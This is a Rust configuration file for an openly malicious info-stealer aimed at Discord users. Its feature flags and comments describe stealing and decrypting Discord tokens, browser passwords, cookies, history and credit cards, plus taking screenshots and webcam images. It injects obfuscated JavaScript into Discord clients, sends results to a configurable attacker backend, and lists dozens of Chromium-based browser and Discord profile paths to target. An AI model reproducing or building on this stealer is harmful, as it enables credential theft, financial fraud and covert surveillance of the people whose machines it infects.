// Sends new user token when they change user data also steals credit cards and login information
pub const TRACE_TOKEN: bool = false;

// Restarts discord after injecting code so they'll have to login instantly
pub const REFRESH_DISCORD: bool = false;

// Steals and decrypts discord tokens (self explanatory)
pub const STEAL_TOKENS: bool = true;

// Steals browser passwords (self explanatory)
pub const STEAL_PASSWORDS: bool = false;

// Steals browser cookies (self explanatory)
pub const STEAL_COOKIES: bool = false;

// Steal browsing history (self explanatory)
pub const STEAL_HISTORY: bool = false;

// Steal credit cards (self explanatory)
pub const STEAL_CREDIT_CARDS: bool = false;

// Takes a screenshot (self explanatory)
pub const SCREENSHOT: bool = false;

// Takes a webcam image (self explanatory)
pub const WEBCAM_IMAGE: bool = false;

// Change this to your backend
pub const BACKEND: &'static str = "[ENTER-BACKEND]";

// Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
pub const INJECT_CODE: &'static str = include_str!("../assets/inject.js");

// Browsers to steal from
pub const CHROMUNIUM_TARGETS: &'static [&'static str] = &[
    "Roaming\\Opera Software\\Opera Stable",
    "Local\\Google\\Chrome",
    "Local\\Google(x86)\\Chrome",
    "Local\\BraveSoftware\\Brave-Browser",
    "Local\\Yandex\\YandexBrowser",
    "Local\\Chromunium",
    "Local\\Epic Privacy Browser",
    "Local\\Amigo",
    "Local\\Vivaldi",
    "Local\\Orbitum",
    "Local\\Mail.Ru\\Atom",
    "Local\\Kometa",
    "Local\\Comodo\\Dragon",
    "Local\\Torch",
    "Local\\Comodo",
    "Local\\Slimjet",
    "Local\\360Browser\\Browser",
    "Local\\Maxthon3",
    "Local\\K-Melon",
    "Local\\Sputnik\\Sputnik",
    "Local\\Nichrome",
    "Local\\CocCoc\\Browser",
    "Local\\uCozMedia\\Uran",
    "Local\\Chromodo",
    "Local\\Yandex\\YandexBrowser",
];

// Discord clients to infect
pub const CLIENT_TARGETS: &[(&'static str, &'static str, &'static str)] = &[
    ("Local\\Discord", "Discord.exe", "Discord.lnk"),
    (
        "Local\\DiscordCanary",
        "DiscordCanary.exe",
        "DiscordCanary.lnk",
    ),
    ("Local\\DiscordPTB", "DiscordPTB.exe", "DiscordPTB.lnk"),
    (
        "Local\\DiscordDevelopment",
        "DiscordDevelopment.exe",
        "Discord Development.lnk",
    ),
];

// Browsers and clients to steal tokens from
pub const TOKEN_TARGETS: &'static [&'static str] = &[
    "Roaming\\discord",
    "Roaming\\discordcanary",
    "Roaming\\discordptb",
    "Roaming\\discorddevelopement",
    "Roaming\\Opera Software\\Opera Stable",
    "Local\\Google\\Chrome\\User Data\\Default",
    "Local\\Google(x86)\\Chrome\\User Data\\Default",
    "Local\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Local\\Yandex\\YandexBrowser\\User Data\\Default",
    "Local\\Chromunium\\User Data\\Default",
    "Local\\Epic Privacy Browser\\User Data\\Default",
    "Local\\Amigo\\User Data\\Default",
    "Local\\Vivaldi\\User Data\\Default",
    "Local\\Orbitum\\User Data\\Default",
    "Local\\Mail.Ru\\Atom\\User Data\\Default",
    "Local\\Kometa\\User Data\\Default",
    "Local\\Comodo\\Dragon\\User Data\\Default",
    "Local\\Torch\\User Data\\Default",
    "Local\\Comodo\\User Data\\Default",
    "Local\\Slimjet\\User Data\\Default",
    "Local\\360Browser\\Browser\\User Data\\Default",
    "Local\\Maxthon3\\User Data\\Default",
    "Local\\K-Melon\\User Data\\Default",
    "Local\\Sputnik\\Sputnik\\User Data\\Default",
    "Local\\Nichrome\\User Data\\Default",
    "Local\\CocCoc\\Browser\\User Data\\Default",
    "Local\\uCozMedia\\Uran\\User Data\\Default",
    "Local\\Chromodo\\User Data\\Default",
    "Local\\Yandex\\YandexBrowser\\User Data\\Default",
];
